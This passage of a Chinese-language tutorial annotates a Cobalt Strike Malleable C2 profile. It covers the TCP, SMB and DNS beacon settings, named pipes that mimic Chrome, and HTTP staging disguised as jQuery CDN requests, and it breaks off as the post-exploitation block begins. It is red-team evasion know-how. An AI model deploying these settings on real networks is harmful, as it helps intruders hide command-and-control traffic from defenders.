+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span>     <span class="err">-</span> <span class="err">https:</span><span class="c1">//www.cobaltstrike.com/help-tcp-beacon
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span>    <span class="err">TCP</span> <span class="err">Frame</span> <span class="err">Header</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>     <span class="err">-</span> <span class="err">Added</span> <span class="err">in</span> <span class="err">CS</span> <span class="mf">4.1</span><span class="err">,</span> <span class="err">prepend</span> <span class="err">header</span> <span class="err">to</span> <span class="err">TCP</span> <span class="err">Beacon</span> <span class="err">messages</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">tcp_port:</span> <span class="mi">4444</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">tcp_frame_header:</span> <span class="err">N\A</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">OPSEC</span> <span class="err">WARNING!!!!!</span> <span class="err">The</span> <span class="err">default</span> <span class="err">port</span> <span class="err">is</span> <span class="mi">4444</span><span class="err">.</span> <span class="err">This</span> <span class="err">is</span> <span class="err">bad.</span> <span class="err">You</span> <span class="err">can</span> <span class="err">change</span> <span class="err">dynamicaly</span> <span class="err">but</span> <span class="err">the</span> <span class="err">port</span> <span class="err">set</span> <span class="err">in</span> <span class="err">the</span> <span class="err">profile</span> <span class="err">will</span> <span class="err">always</span> <span class="err">be</span> <span class="err">used</span> <span class="err">first</span> <span class="err">before</span> <span class="err">switching</span> <span class="err">to</span> <span class="err">the</span> <span class="err">dynamic</span> <span class="err">port.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Use</span> <span class="err">a</span> <span class="err">port</span> <span class="err">other</span> <span class="err">that</span> <span class="err">default.</span> <span class="err">Choose</span> <span class="err">something</span> <span class="err">not</span> <span class="err">is</span> <span class="err">use.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Use</span> <span class="err">a</span> <span class="err">port</span> <span class="err">greater</span> <span class="err">than</span> <span class="mi">1024</span> <span class="err">is</span> <span class="err">generally</span> <span class="err">a</span> <span class="err">good</span> <span class="err">idea</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">tcp_port</span> <span class="s2">&#34;42585&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">tcp_frame_header</span> <span class="s2">&#34;\x80&#34;</span><span class="err">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>设置tcp beacon的端口和tcp帧的header字节。</p>
+<h3 id="smb-beacon">SMB Beacon</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">SMB</span> <span class="err">beacons</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Peer-to-peer</span> <span class="err">beacon</span> <span class="err">using</span> <span class="err">SMB</span> <span class="err">for</span> <span class="err">communication</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">SMB</span> <span class="err">Frame</span> <span class="err">Header</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>     <span class="err">-</span> <span class="err">Added</span> <span class="err">in</span> <span class="err">CS</span> <span class="mf">4.1</span><span class="err">,</span> <span class="err">prepend</span> <span class="err">header</span> <span class="err">to</span> <span class="err">SMB</span> <span class="err">Beacon</span> <span class="err">messages</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">pipename:</span> <span class="err">msagent_##</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">pipename_stager:</span> <span class="err">status_##</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">smb_frame_header:</span> <span class="err">N\A</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Do</span> <span class="err">not</span> <span class="err">use</span> <span class="err">an</span> <span class="err">existing</span> <span class="err">namedpipe,</span> <span class="err">Beacon</span> <span class="err">doesn&#39;t</span> <span class="err">check</span> <span class="err">for</span> <span class="err">conflict!</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">the</span> <span class="err">##</span> <span class="err">is</span> <span class="err">replaced</span> <span class="err">with</span> <span class="err">a</span> <span class="err">number</span> <span class="err">unique</span> <span class="err">to</span> <span class="err">a</span> <span class="err">teamserver</span>     
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">---------------------</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">pipename</span>         <span class="s2">&#34;mojo.5688.8052.183894939787088877##&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Common</span> <span class="err">Chrome</span> <span class="err">named</span> <span class="err">pipe</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">pipename_stager</span>  <span class="s2">&#34;mojo.5688.8052.35780273329370473##&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Common</span> <span class="err">Chrome</span> <span class="err">named</span> <span class="err">pipe</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">smb_frame_header</span> <span class="s2">&#34;\x80&#34;</span><span class="err">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>配置pipe的名字和smb帧的header字节。SMB Beacon使用pipe通过父beacon进行通信，实现在同一主机或者网络上的beacon直接进行点对点通信。</p>
+<h3 id="dns-beacon">DNS Beacon</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">DNS</span> <span class="err">beacons</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Beacon</span> <span class="err">that</span> <span class="err">uses</span> <span class="err">DNS</span> <span class="err">for</span> <span class="err">communication</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">dns_idle:</span> <span class="mf">0.0</span><span class="err">.</span><span class="mf">0.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">dns_max_txt:</span> <span class="mi">252</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">dns_sleep:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">dns_stager_prepend:</span> <span class="err">N/A</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">dns_stager_subhost:</span> <span class="err">.stage.</span><span class="mi">123456</span><span class="err">.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">dns_ttl:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">maxdns:</span> <span class="mi">255</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">beacon:</span> <span class="err">N/A</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">get_A:</span>  <span class="err">cdn.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">get_AAAA:</span> <span class="err">www</span><span class="mi">6</span><span class="err">.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">get_TXT:</span> <span class="err">api.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">put_metadata:</span> <span class="err">www.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">put_output:</span> <span class="err">post.</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">ns_reponse:</span> <span class="err">drop</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">DNS</span> <span class="err">beacons</span> <span class="err">generate</span> <span class="err">a</span> <span class="err">lot</span> <span class="err">of</span> <span class="err">DNS</span> <span class="err">request.</span> <span class="err">DNS</span> <span class="err">beacon</span> <span class="err">are</span> <span class="err">best</span> <span class="err">used</span> <span class="err">as</span> <span class="err">low</span> <span class="err">and</span> <span class="err">slow</span> <span class="err">back</span> <span class="err">up</span> <span class="err">C</span><span class="mi">2</span> <span class="err">channels</span>
+</span></span><span class="line"><span class="cl"><span class="err">dns-beacon</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Options</span> <span class="err">moved</span> <span class="err">into</span> <span class="nt">&#34;dns-beacon&#34;</span> <span class="err">group</span> <span class="err">in</span> <span class="err">version</span> <span class="mf">4.3</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">dns_idle</span>           <span class="s2">&#34;74.125.196.113&#34;</span><span class="err">;</span> <span class="err">#google.com</span> <span class="err">(change</span> <span class="err">this</span> <span class="err">to</span> <span class="err">match</span> <span class="err">your</span> <span class="err">campaign)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">dns_max_txt</span>        <span class="s2">&#34;252&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">dns_sleep</span>          <span class="s2">&#34;0&#34;</span><span class="err">;</span> <span class="err">#</span>    <span class="err">Force</span> <span class="err">a</span> <span class="err">sleep</span> <span class="err">prior</span> <span class="err">to</span> <span class="err">each</span> <span class="err">individual</span> <span class="err">DNS</span> <span class="err">request.</span> <span class="err">(in</span> <span class="err">milliseconds)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">dns_ttl</span>            <span class="s2">&#34;5&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">maxdns</span>             <span class="s2">&#34;255&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">dns_stager_prepend</span> <span class="s2">&#34;.resources.123456.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">dns_stager_subhost</span> <span class="s2">&#34;.feeds.123456.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">DNS</span> <span class="err">subhosts</span> <span class="err">override</span> <span class="err">options</span><span class="p">,</span> <span class="err">added</span> <span class="err">in</span> <span class="err">version</span> <span class="err">4.3</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">beacon</span>           <span class="nt">&#34;a.bc.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">get_A</span>            <span class="s2">&#34;b.1a.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">get_AAAA</span>         <span class="s2">&#34;c.4a.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">get_TXT</span>          <span class="s2">&#34;d.tx.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">put_metadata</span>     <span class="s2">&#34;e.md.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">put_output</span>       <span class="s2">&#34;f.po.&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">ns_response</span>      <span class="s2">&#34;zero&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>配置DNS的解析等内容，文档说明比较明显，基本不用修改。</p>
+<h3 id="staging-process">Staging process</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Staging</span> <span class="err">process</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">OPSEC</span> <span class="err">WARNING!!!!</span> <span class="err">Staging</span> <span class="err">has</span> <span class="err">serious</span> <span class="err">OPSEC</span> <span class="err">issues.</span> <span class="err">It</span> <span class="err">is</span> <span class="err">recommed</span> <span class="err">to</span> <span class="err">disable</span> <span class="err">staging</span> <span class="err">and</span> <span class="err">use</span> <span class="err">stageless</span> <span class="err">payloads</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Malleable</span> <span class="err">C</span><span class="mi">2</span><span class="err">&#39;s</span> <span class="err">http-stager</span> <span class="err">block</span> <span class="err">customizes</span> <span class="err">the</span> <span class="err">HTTP</span> <span class="err">staging</span> <span class="err">process</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Defaults:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">uri_x</span><span class="mi">86</span> <span class="err">Random</span> <span class="err">String</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">uri_x</span><span class="mi">64</span> <span class="err">Random</span> <span class="err">String</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">HTTP</span> <span class="err">Server</span> <span class="err">Headers</span> <span class="err">-</span> <span class="err">Basic</span> <span class="err">HTTP</span> <span class="err">Headers</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">HTTP</span> <span class="err">Client</span> <span class="err">Headers</span> <span class="err">-</span> <span class="err">Basic</span> <span class="err">HTTP</span> <span class="err">Headers</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Guidelines:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Add</span> <span class="err">customize</span> <span class="err">HTTP</span> <span class="err">headers</span> <span class="err">to</span> <span class="err">the</span> <span class="err">HTTP</span> <span class="err">traffic</span> <span class="err">of</span> <span class="err">your</span> <span class="err">campaign</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">-</span> <span class="err">Only</span> <span class="err">specify</span> <span class="err">the</span> <span class="err">`Host`</span> <span class="err">header</span> <span class="err">when</span> <span class="err">peforming</span> <span class="err">domain</span> <span class="err">fronting.</span> <span class="err">Be</span> <span class="err">aware</span> <span class="err">of</span> <span class="err">HTTP</span> <span class="err">proxy&#39;s</span> <span class="err">rewriting</span> <span class="err">your</span> <span class="err">request</span> <span class="err">per</span> <span class="err">RFC</span><span class="mi">2616</span> <span class="err">Section</span> <span class="mf">14.23</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>      <span class="err">-</span> <span class="err">https:</span><span class="c1">//blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span>    <span class="err">-</span> <span class="err">Note:</span> <span class="err">Data</span> <span class="err">transform</span> <span class="err">language</span> <span class="err">not</span> <span class="err">supported</span> <span class="err">in</span> <span class="err">http</span> <span class="err">stageing</span> <span class="err">(mask,</span> <span class="err">base</span><span class="mi">64</span><span class="err">,</span> <span class="err">base</span><span class="mi">64</span><span class="err">url,</span> <span class="err">etc)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#set</span> <span class="err">host_stage</span> <span class="s2">&#34;false&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Do</span> <span class="err">not</span> <span class="err">use</span> <span class="err">staging.</span> <span class="err">Must</span> <span class="err">use</span> <span class="err">stageles</span> <span class="err">payloads,</span> <span class="err">now</span> <span class="err">the</span> <span class="err">default</span> <span class="err">for</span> <span class="err">Cobalt</span> <span class="err">Strike</span> <span class="err">built-in</span> <span class="err">processes</span>
+</span></span><span class="line"><span class="cl"><span class="err">set</span> <span class="err">host_stage</span> <span class="s2">&#34;true&#34;</span><span class="err">;</span> <span class="err">#</span> <span class="err">Host</span> <span class="err">payload</span> <span class="err">for</span> <span class="err">staging</span> <span class="err">over</span> <span class="err">HTTP,</span> <span class="err">HTTPS,</span> <span class="err">or</span> <span class="err">DNS.</span> <span class="err">Required</span> <span class="err">by</span> <span class="err">stagers.set</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">http-stager</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">uri_x86</span> <span class="nt">&#34;/jquery-3.3.1.slim.min.js&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">set</span> <span class="err">uri_x</span><span class="mi">64</span> <span class="s2">&#34;/jquery-3.3.2.slim.min.js&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="nt">&#34;Server&#34;</span> <span class="s2">&#34;NetDNA-cache/2.2&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Cache-Control&#34;</span> <span class="s2">&#34;max-age=0, no-cache&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Pragma&#34;</span> <span class="s2">&#34;no-cache&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Connection&#34;</span> <span class="s2">&#34;keep-alive&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Content-Type&#34;</span> <span class="s2">&#34;application/javascript; charset=utf-8&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">output</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="err">##</span> <span class="err">The</span> <span class="err">javascript</span> <span class="err">was</span> <span class="err">changed.</span>  <span class="err">Double</span> <span class="err">quotes</span> <span class="err">and</span> <span class="err">backslashes</span> <span class="err">were</span> <span class="err">escaped</span> <span class="err">to</span> <span class="err">properly</span> <span class="err">render</span> <span class="err">(Refer</span> <span class="err">to</span> <span class="err">Tips</span> <span class="err">for</span> <span class="err">Profile</span> <span class="err">Parameter</span> <span class="err">Values)</span>
+</span></span><span class="line"><span class="cl">            <span class="err">#</span> <span class="err">2nd</span> <span class="err">Line</span>            
+</span></span><span class="line"><span class="cl">            <span class="err">prepend</span> <span class="nt">&#34;!function...省略...P=\&#34;\r&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">#</span> <span class="mi">1</span><span class="err">st</span> <span class="err">Line</span>
+</span></span><span class="line"><span class="cl">            <span class="err">prepend</span> <span class="s2">&#34;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">append</span> <span class="s2">&#34;\&#34;.(o=t.documentElement...省略...(e.jQuery=e.$=w),w});&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">            <span class="err">print;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">client</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="nt">&#34;Accept&#34;</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Accept-Language&#34;</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">#header</span> <span class="s2">&#34;Host&#34;</span> <span class="s2">&#34;code.jquery.com&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Referer&#34;</span> <span class="s2">&#34;http://code.jquery.com/&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">header</span> <span class="s2">&#34;Accept-Encoding&#34;</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>设置staging相关内容，但是OPSEC建议使用stageless的payload，目的是减少通信，一次上钩，防止被安全防护产品报警。但是实战里面还是存在staging的场景。该部分可以设置stager的各种特性，模仿单个合法的http请求/响应。</p>
+<p>在此示例中，请求将发送到<code>/jquery-3.3.1.slim.min.js</code>或者<code>/jquery-3.3.2.slim.min.js</code>，然后开始staging过程。构建http服务器参数以模仿jQuery请求。Beacon命令和payload会被混合到jQuery的javascript文本块中。从CDN请求jQuery时，客户端发出一个合理的请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span> <span class="o">=</span><span class="err">“</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.3</span><span class="p">.</span><span class="mf">1.</span><span class="nx">min</span><span class="p">.</span><span class="nx">js</span><span class="err">”</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="err">/ script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以把uri修改为类似其他CDN的形式，例如可以修改http-stager，模仿Microsoft jQuery：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span> <span class="o">=</span><span class="err">“</span><span class="nx">https</span><span class="o">:</span><span class="c1">//ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js”&gt; &lt;/script&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="post-exploitation">Post Exploitation</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Post</span> <span class="err">Exploitation</span>
+</span></span><span class="line"><span class="cl"><span class="err">################################################</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span> <span class="err">Description:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">Controls</span> <span class="err">post-exploitation</span> <span class="err">jobs,</span> <span class="err">including</span> <span class="err">default</span> <span class="err">x</span><span class="mi">86</span><span class="err">/x</span><span class="mi">64</span> <span class="err">program</span> <span class="err">to</span> <span class="err">open</span> <span class="err">and</span> <span class="err">inject</span> <span class="err">shellcode</span> <span class="err">into,</span> <span class="err">AMSI</span> <span class="err">bypass</span> <span class="err">for</span> <span class="err">execute-assembly,</span> <span class="err">powerpick,</span> <span class="err">and</span> <span class="err">psinject</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">https:</span><span class="c1">//www.cobaltstrike.com/help-malleable-postex
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span> <span class="err">Values:</span>
+</span></span><span class="line"><span class="cl"><span class="err">##</span>    <span class="err">spawnto_x</span><span class="mi">86</span>       <span class="err">%windir%\\syswow</span><span class="mi">64</span><span class="err">\\rundll</span><span class="mi">32</span><span class="err">.exe</span>
